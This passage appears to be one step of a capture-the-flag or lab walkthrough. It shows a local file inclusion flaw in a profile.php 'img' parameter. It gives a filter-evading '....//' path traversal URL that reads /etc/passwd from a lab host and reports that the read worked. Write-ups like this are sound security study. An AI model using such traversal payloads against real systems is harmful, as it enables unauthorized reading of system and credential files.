## 🧬 Step 7: Local File Inclusion (LFI)

Vulnerable parameter:

```
profile.php?img=profile.png
```

Exploit:

```
http://10.48.131.44:50000/profile.php?img=....//....//....//....//etc/passwd
```

### Output:
- /etc/passwd contents retrieved  

---

